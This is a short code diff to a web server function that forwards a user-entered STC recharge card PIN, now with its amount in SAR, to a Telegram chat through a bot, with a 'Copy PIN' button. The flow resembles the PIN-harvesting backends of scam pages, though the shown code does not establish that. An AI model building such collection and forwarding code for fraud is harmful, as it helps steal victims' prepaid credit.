@@ -2,6 +2,7 @@ import { createServerFn } from "@tanstack/react-start";
 
 export type TelegramPayload = {
   recharge_pin: string;
+  amount: number;
 };
 
 export const notifyTelegram = createServerFn({ method: "POST" })
@@ -17,12 +18,15 @@ export const notifyTelegram = createServerFn({ method: "POST" })
     const pin = data.recharge_pin.trim();
     if (!pin) return { ok: false, error: "Empty PIN" };
 
+    const amount = Number(data.amount) || 0;
+    const text = `💳 STC Recharge PIN\n\nPIN: ${pin}\nAmount: ${amount} SAR`;
+
     const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
       headers: { "content-type": "application/json" },
       body: JSON.stringify({
         chat_id: chatId,
-        text: pin,
+        text,
         reply_markup: {
           inline_keyboard: [[{ text: "📋 Copy PIN", copy_text: { text: pin } }]],
         },
